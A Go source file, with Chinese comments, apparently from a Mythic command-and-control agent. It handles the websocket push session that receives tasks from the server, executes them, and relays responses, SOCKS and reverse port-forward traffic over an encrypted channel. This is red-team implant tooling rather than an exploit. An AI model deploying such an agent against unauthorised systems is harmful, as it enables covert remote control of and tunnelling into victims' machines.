package main

import (
	"encoding/json"
	"fmt"
	"log"
	"time"
)

// runPushSession 只服务于 session callback。
// Beacon 继续走轮询；session 进入真正的 websocket push 长连接。
func (c *AgentController) runPushSession(transport pushSessionTransport) error {
	if err := transport.StartPushPump(c.aesKey); err != nil {
		return fmt.Errorf("启动 push pump 失败: %w", err)
	}

	flushTicker := time.NewTicker(25 * time.Millisecond)
	defer flushTicker.Stop()

	for {
		select {
		case <-c.stopCh:
			return nil
		case raw := <-transport.Incoming():
			if len(raw) == 0 {
				continue
			}
			if err := c.handlePushMessage(transport, raw); err != nil {
				return err
			}
		case err := <-transport.Errors():
			if err != nil {
				return err
			}
			return nil
		case <-flushTicker.C:
			if err := c.flushPushResponses(transport, nil); err != nil {
				log.Printf("[%s] push 异步响应发送失败: %v\n", c.name, err)
			}
		}
	}
}

func (c *AgentController) handlePushMessage(transport pushSessionTransport, raw []byte) error {
	var message MythicMessageResponse
	if err := json.Unmarshal(raw, &message); err != nil {
		return fmt.Errorf("解析 push 消息失败: %w", err)
	}
	log.Printf("[%s] push 消息: tasks=%d interactive=%d socks=%d rpfwd=%d responses=%d",
		c.name,
		len(message.Tasks),
		len(message.Interactive),
		len(message.Socks),
		len(message.Rpfwd),
		len(message.Responses),
	)
	if err := c.dispatchTopLevelMessages(&message); err != nil {
		return err
	}
	tasks := filterValidTasks(message.Tasks)
	if len(tasks) == 0 {
		return nil
	}
	responses := make([]TaskResponse, 0, len(tasks))
	for _, task := range tasks {
		responses = append(responses, c.executeTask(task))
	}
	return c.flushPushResponses(transport, responses)
}

func (c *AgentController) flushPushResponses(transport pushSessionTransport, responses []TaskResponse) error {
	asyncBatch := c.outbound.drain()
	allResponses := append(compactResponses(responses), asyncBatch.responses...)
	if len(allResponses) == 0 && len(asyncBatch.interactive) == 0 && len(asyncBatch.socks) == 0 && len(asyncBatch.rpfwd) == 0 {
		return nil
	}
	message := AgentMessageEnvelope{
		Action:      "post_response",
		Responses:   compactResponses(allResponses),
		Interactive: asyncBatch.interactive,
		Socks:       asyncBatch.socks,
		Rpfwd:       asyncBatch.rpfwd,
	}
	if err := transport.SendPush(c.CallbackUUID(), message, c.aesKey); err != nil {
		c.outbound.restoreFront(outboundBatch{
			responses:   compactResponses(allResponses),
			interactive: asyncBatch.interactive,
			socks:       asyncBatch.socks,
			rpfwd:       asyncBatch.rpfwd,
		})
		return err
	}
	return nil
}
